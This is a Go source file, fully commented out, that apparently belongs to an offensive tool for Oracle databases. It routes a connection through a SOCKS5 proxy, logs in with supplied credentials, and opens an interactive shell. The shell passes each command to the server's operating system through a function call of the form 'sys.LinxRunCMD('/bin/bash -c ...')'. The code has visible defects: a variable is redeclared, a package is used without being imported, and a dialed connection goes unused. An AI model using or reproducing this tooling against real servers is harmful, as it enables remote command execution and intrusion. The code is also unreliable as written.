package pac

//
//import (
//	"bufio"
//	"database/sql"
//	"fmt"
//	"golang.org/x/net/proxy"
//	"net"
//	"net/url"
//	"os"
//	"strings"
//)
//
//func GetSOCKS5Client() (*socks5.Client, error) {
//	var credentials *socks5.Credential
//	if *Suser != "" && *Spass != "" {
//		credentials = &socks5.StaticCredentials{
//			*Suser: *Spass,
//		}
//	}
//	conf := &socks5.Config{
//		Credentials: credentials,
//		Dial:        func(network, addr string) (net.Conn, error) { return proxyDial(network, addr) },
//	}
//	return socks5.New(conf)
//}
//
//func proxyDial(network, addr string) (net.Conn, error) {
//	var proxyURL *url.URL
//	if *Shost != "" && *Sport != "" {
//		proxy := fmt.Sprintf("socks5://%s:%s", *Shost, *Sport)
//		var err error
//		proxyURL, err = url.Parse(proxy)
//		if err != nil {
//			return nil, err
//		}
//	} else {
//		return nil, fmt.Errorf("socks5 proxy not set")
//	}
//	dialer, err := proxy.FromURL(proxyURL, nil)
//	if err != nil {
//		return nil, err
//	}
//	return dialer.Dial(network, addr)
//}
//
//func OracleCMD(cmd string, conn *sql.DB) ([][]interface{}, error) {
//	rows, err := conn.Query(cmd)
//	if err != nil {
//		return nil, err
//	}
//	defer rows.Close()
//	cols, err := rows.Columns()
//	if err != nil {
//		return nil, err
//	}
//	var resultSet [][]interface{}
//	for rows.Next() {
//		var row []interface{}
//		for i := 0; i < len(cols); i++ {
//			var col interface{}
//			row = append(row, &col)
//		}
//		err = rows.Scan(row...)
//		if err != nil {
//			return nil, err
//		}
//		var resultRow []interface{}
//		for _, col := range row {
//			resultRow = append(resultRow, *col.(*interface{}))
//		}
//		resultSet = append(resultSet, resultRow)
//	}
//	return resultSet, nil
//}
//
//func OracleExportExtensionConsole() {
//	client, err := GetSOCKS5Client()
//	if err != nil {
//		fmt.Println("Failed to create SOCKS5 client:", err)
//		return
//	}
//	dialer, err := client.Dialer()
//	if err != nil {
//		fmt.Println("Failed to create SOCKS5 dialer:", err)
//		return
//	}
//
//	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%s", *Rhost, *Rport))
//	if err != nil {
//		fmt.Println("Failed to dial Oracle database through SOCKS5 proxy:", err)
//		return
//	}
//	defer conn.Close()
//
//	dsn := fmt.Sprintf("%s/%s@%s:%s/%s", *Ruser, *Rpass, *Rhost, *Rport, *Rsid)
//	conn, err := sql.Open("ora", dsn)
//	if err != nil {
//		fmt.Println("Failed to connect to Oracle:", err)
//		return
//	}
//	defer conn.Close()
//
//	reader := bufio.NewReader(os.Stdin)
//	for {
//		fmt.Printf("%s:%s> $ ", *Rhost, *Rport)
//		cmd, _ := reader.ReadString('\n')
//		cmd = strings.TrimRight(cmd, "\r\n")
//		if cmd == "exit" || cmd == "q" || cmd == "quit" {
//			break
//		}
//
//		resultSet, err := OracleCMD(fmt.Sprintf("select sys.LinxRunCMD('/bin/bash -c /usr/bin/%s') from dual", cmd), conn)
//		for _, m := range resultSet {
//			for _, value := range m {
//				fmt.Println(fmt.Sprintf("%s", value))
//			}
//		}
//		if err != nil {
//			fmt.Println("Failed to execute command:", err)
//		}
//	}
//}
